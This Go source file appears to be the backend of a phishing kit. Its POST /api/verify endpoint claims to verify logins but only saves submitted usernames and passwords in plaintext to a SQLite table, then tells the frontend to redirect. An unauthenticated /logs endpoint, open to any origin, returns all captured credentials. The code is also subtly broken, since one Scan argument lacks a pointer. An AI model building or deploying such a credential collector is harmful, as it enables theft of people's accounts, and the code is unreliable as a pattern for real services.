package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
	_ "modernc.org/sqlite"
)

type CodeLog struct {
	ID        int    `json:"id"`
	User      string `json:"username"`
	Password  string `json:"password"`
	Timestamp string `json:"timestamp"`
}

func main() {
	db, err := sql.Open("sqlite", "auth.db")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// Ensure table exists
	db.Exec(`CREATE TABLE IF NOT EXISTS logins (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		user TEXT NOT NULL,
		password TEXT NOT NULL,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
	);`)

	e := echo.New()

	// Enhanced Logging Middleware
	e.Use(middleware.RequestLoggerWithConfig(middleware.RequestLoggerConfig{
		LogStatus: true,
		LogURI:    true,
		BeforeNextFunc: func(c *echo.Context) {
			c.Set("customValueFromContext", 42)
		},
		LogValuesFunc: func(c *echo.Context, v middleware.RequestLoggerValues) error {
			value, _ := c.Get("customValueFromContext").(int)
			fmt.Printf("REQUEST: uri: %v, status: %v, custom-value: %v\n", v.URI, v.Status, value)
			return nil
		},
	}))

	e.Use(middleware.Recover())
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
	}))

	api := e.Group("/api")

	// GET: Retrieve all submitted codes (Newest first)
	e.GET("/logs", func(c *echo.Context) error {
		rows, err := db.Query("SELECT id, user, password, timestamp FROM logins ORDER BY timestamp DESC")
		if err != nil {
			return echo.NewHTTPError(http.StatusInternalServerError, "DB error")
		}
		defer rows.Close()

		var results []CodeLog
		for rows.Next() {
			var l CodeLog
			rows.Scan(&l.ID, &l.User, l.Password, &l.Timestamp)
			results = append(results, l)
		}
		return c.JSON(http.StatusOK, results)
	})

	// POST: Save the entered code to the database
	api.POST("/verify", func(c *echo.Context) error {
		var req struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := c.Bind(&req); err != nil {
			return echo.NewHTTPError(http.StatusBadRequest, "Invalid JSON")
		}

		// Insert the code into the DB
		_, err := db.Exec("INSERT INTO logins (user, password) VALUES (?, ?)", req.Username, req.Password)
		if err != nil {
			return echo.NewHTTPError(http.StatusInternalServerError, "Failed to save code")
		}

		// Return success so the React frontend can redirect
		return c.JSON(http.StatusOK, map[string]interface{}{
			"success": true,
			"message": "Code recorded in lab database",
		})
	})

	e.Use(middleware.StaticWithConfig(middleware.StaticConfig{
		Root:   "dist",
		Index:  "index.html",
		HTML5:  true,
		Browse: false,
	}))

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Fatal(e.Start(":" + port))
}
